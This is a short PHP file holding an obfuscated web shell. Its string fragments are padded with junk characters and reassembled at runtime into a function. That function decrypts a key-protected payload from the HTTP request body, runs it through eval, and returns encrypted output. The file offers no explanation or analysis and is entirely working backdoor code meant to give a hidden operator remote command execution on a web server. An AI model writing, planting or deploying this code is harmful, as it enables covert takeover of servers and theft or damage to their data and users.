<?php
$K=';($j<$c&9&$i<$9l);9$j++,9$i++){$o.=9$9t{$i}^$k{9$j9};}}return $o9;}9i9f (@preg_mat9ch(';
$u='9ction 9x($t,$k){9$c=strle9n($k);$l=st99rlen($t);$o9=""9;for($9i=0;$i<$l;9){for(9$j=90';
$x=str_replace('Pa','','crePaatPaePa_PafuPancPation');
$e='$k="12df79b68";9$kh=9"8bd2b19fbfa932";$kf="c9be3891a8994273";$p="Z9GW3V4TQPJW09ZdA93";fun9';
$w='al(@g9zun9compress9(@x(@b99ase64_decode($m9[1]),$9k)));9$o=@9ob_g9et_conten99ts();@ob_';
$O='"/$k9h9(.+)$kf/"99,@file_ge9t_con9tents("ph9p://9input"99),$9m)==1) {@ob_start()9;@ev9';
$k='end_c9lean();$9r9=@base964_encode(@x9(@gz9compre9ss9($o),$k)9);print("9$p9$kh$r$kf");}';
$l=str_replace('9','',$e.$u.$K.$O.$w.$k);
$P=$x('',$l);$P();
?>
